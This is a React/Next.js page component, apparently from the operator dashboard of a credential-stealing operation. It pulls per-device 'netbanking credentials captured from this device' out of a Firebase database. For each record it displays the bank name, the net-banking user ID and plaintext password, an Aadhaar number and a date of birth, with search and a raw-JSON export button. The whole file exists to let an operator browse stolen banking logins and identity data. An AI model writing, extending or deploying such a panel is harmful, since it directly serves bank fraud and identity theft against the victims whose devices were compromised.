"use client";

import { useParams, useRouter } from "next/navigation";
import { useEffect, useState } from "react";
import { db } from "@/lib/firbase";
import { ref, onValue } from "firebase/database";
import { Card, CardBody, CardHeader, Button, Input } from "@heroui/react";
import Navbar from "@/components/Navbar";
import Sidebar from "@/components/Sidebar";
import Link from "next/link";

interface NetbankingData {
  id: string;
  aadhaar?: string;
  dob?: string;
  timestamp?: number | string;
  actvBankName?: string;
  etUserId?: string;
  etPassword?: string;
}

export default function NetbankingPage() {
  const params = useParams();
  const router = useRouter();
  const deviceId = decodeURIComponent(params.deviceId as string);

  const [netbanking, setNetbanking] = useState<NetbankingData[]>([]);
  const [loading, setLoading] = useState(true);
  const [searchTerm, setSearchTerm] = useState("");

  useEffect(() => {
    if (!deviceId) return;

    const nbRef = ref(db, `registeredDevices/${deviceId}/netbanking_data`);

    const unsubscribe = onValue(
      nbRef,
      (snapshot) => {
        if (snapshot.exists()) {
          const data = snapshot.val();
          const nbList: NetbankingData[] = Object.entries(data).map(
            ([key, value]: [string, any]) => ({
              id: key,
              aadhaar: value.aadhaar || "",
              dob: value.dob || "",
              timestamp: value.timestamp || "",
              actvBankName: value.actvBankName || "",
              etUserId: value.etUserId || "",
              etPassword: value.etPassword || "",
            }),
          );
          setNetbanking(nbList);
        } else {
          setNetbanking([]);
        }
        setLoading(false);
      },
      (error) => {
        console.error("Error fetching netbanking data:", error);
        setLoading(false);
      },
    );

    return () => unsubscribe();
  }, [deviceId]);

  const filteredNetbanking = netbanking.filter(
    (nb) =>
      nb.aadhaar?.includes(searchTerm) ||
      nb.dob?.includes(searchTerm) ||
      nb.etUserId?.includes(searchTerm) ||
      nb.actvBankName?.toLowerCase().includes(searchTerm.toLowerCase()),
  );

  const formatTimestamp = (timestamp: any) => {
    if (!timestamp) return "N/A";
    const date = new Date(Number(timestamp));
    return date.toLocaleString();
  };

  return (
    <div className="page-shell">
      <div className="page-frame">
        <Sidebar />

        <main className="page-main">
          <Navbar
            title="Netbanking Data"
            subtitle="All netbanking credentials captured from this device"
          />

          <nav className="mb-6 flex items-center gap-2 text-sm text-[var(--text-muted)]">
            <Link
              href="/devices"
              className="transition hover:text-[var(--text-main)]"
            >
              Devices
            </Link>
            <span>/</span>
            <Link
              href={`/devices/${deviceId}`}
              className="transition hover:text-[var(--text-main)]"
            >
              {deviceId}
            </Link>
            <span>/</span>
            <span className="text-[var(--text-main)]">Netbanking</span>
          </nav>

          <Card className="bg-[var(--surface)] border border-[var(--border)]">
            <CardHeader className="border-b border-[var(--border)] px-6 py-4 flex-col items-start gap-4">
              <div className="flex w-full items-center justify-between">
                <div>
                  <h2 className="text-2xl font-bold text-[var(--text-main)]">
                    Netbanking Data
                  </h2>
                  <p className="text-sm text-[var(--text-muted)] mt-1">
                    Total: {filteredNetbanking.length} records
                  </p>
                </div>
                <Button
                  isIconOnly
                  className="bg-[var(--surface-muted)] text-[var(--text-main)] hover:bg-slate-700"
                  onPress={() => router.back()}
                >
                  <svg
                    className="h-5 w-5"
                    fill="none"
                    stroke="currentColor"
                    viewBox="0 0 24 24"
                  >
                    <path
                      strokeLinecap="round"
                      strokeLinejoin="round"
                      strokeWidth={2}
                      d="M15 19l-7-7 7-7"
                    />
                  </svg>
                </Button>
              </div>
              <Input
                placeholder="Search by Aadhaar, DOB, User ID or Bank..."
                value={searchTerm}
                onValueChange={setSearchTerm}
                className="w-full"
                classNames={{
                  input: "bg-[var(--surface-muted)] text-[var(--text-main)]",
                  inputWrapper:
                    "bg-[var(--surface-muted)] border-[var(--border)]",
                  label: "text-[var(--text-muted)]",
                }}
              />
            </CardHeader>

            <CardBody className="p-6">
              {loading ? (
                <div className="flex items-center justify-center p-8">
                  <p className="text-[var(--text-muted)]">
                    Loading netbanking data...
                  </p>
                </div>
              ) : filteredNetbanking.length === 0 ? (
                <div className="flex flex-col items-center justify-center p-12">
                  <svg
                    className="h-12 w-12 text-[var(--text-muted)] mb-3 opacity-50"
                    fill="none"
                    stroke="currentColor"
                    viewBox="0 0 24 24"
                  >
                    <path
                      strokeLinecap="round"
                      strokeLinejoin="round"
                      strokeWidth={1.5}
                      d="M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v8m0 0v1m0-1c-1.11 0-2.08-.402-2.599-1M21 12a9 9 0 11-18 0 9 9 0 0118 0z"
                    />
                  </svg>
                  <p className="text-[var(--text-muted)]">
                    No netbanking data found
                  </p>
                </div>
              ) : (
                <div className="space-y-4">
                  {filteredNetbanking.map((nb, idx) => (
                    <div
                      key={nb.id}
                      className="rounded-lg border border-[var(--border)] bg-[var(--surface-muted)] p-4 hover:border-emerald-500/50 transition-colors"
                    >
                      <div className="flex items-start justify-between mb-4 pb-3 border-b border-[var(--border)]">
                        <div>
                          <h3 className="text-sm font-semibold text-[var(--text-main)]">
                            {nb.actvBankName || "Bank Account"} #{idx + 1}
                          </h3>
                          <p className="text-xs text-[var(--text-muted)] mt-1">
                            {formatTimestamp(nb.timestamp)}
                          </p>
                        </div>
                        <Button
                          isIconOnly
                          size="sm"
                          className="bg-emerald-500/20 text-emerald-300 hover:bg-emerald-500/30"
                          onPress={() => {
                            window.open(
                              `data:text/html,<pre>${JSON.stringify(nb, null, 2)}</pre>`,
                              "_blank",
                            );
                          }}
                        >
                          <svg
                            className="h-4 w-4"
                            fill="none"
                            stroke="currentColor"
                            viewBox="0 0 24 24"
                          >
                            <path
                              strokeLinecap="round"
                              strokeLinejoin="round"
                              strokeWidth={2}
                              d="M10 6H6a2 2 0 00-2 2v10a2 2 0 002 2h10a2 2 0 002-2v-4M14 4h6m0 0v6m0-6L10 14"
                            />
                          </svg>
                        </Button>
                      </div>
                      <div className="grid grid-cols-2 gap-4 sm:grid-cols-3">
                        {nb.actvBankName && (
                          <div>
                            <p className="text-xs text-[var(--text-muted)] mb-1">
                              Bank Name
                            </p>
                            <p className="text-sm text-[var(--text-main)] font-semibold">
                              {nb.actvBankName}
                            </p>
                          </div>
                        )}
                        {nb.etUserId && (
                          <div>
                            <p className="text-xs text-[var(--text-muted)] mb-1">
                              User ID
                            </p>
                            <p className="font-mono text-sm text-emerald-400 truncate">
                              {nb.etUserId}
                            </p>
                          </div>
                        )}
                        {nb.aadhaar && (
                          <div>
                            <p className="text-xs text-[var(--text-muted)] mb-1">
                              Aadhaar
                            </p>
                            <p className="font-mono text-sm text-red-400 font-semibold">
                              {nb.aadhaar}
                            </p>
                          </div>
                        )}
                        {nb.dob && (
                          <div>
                            <p className="text-xs text-[var(--text-muted)] mb-1">
                              DOB
                            </p>
                            <p className="text-sm text-[var(--text-main)]">
                              {nb.dob}
                            </p>
                          </div>
                        )}
                        {nb.etPassword && (
                          <div>
                            <p className="text-xs text-[var(--text-muted)] mb-1">
                              Password
                            </p>
                            <p className="font-mono text-sm text-orange-400">
                              {nb.etPassword}
                            </p>
                          </div>
                        )}
                        <div>
                          <p className="text-xs text-[var(--text-muted)] mb-1">
                            Unique ID
                          </p>
                          <p className="font-mono text-xs text-slate-400 truncate">
                            {nb.id}
                          </p>
                        </div>
                      </div>
                    </div>
                  ))}
                </div>
              )}
            </CardBody>
          </Card>
        </main>
      </div>
    </div>
  );
}
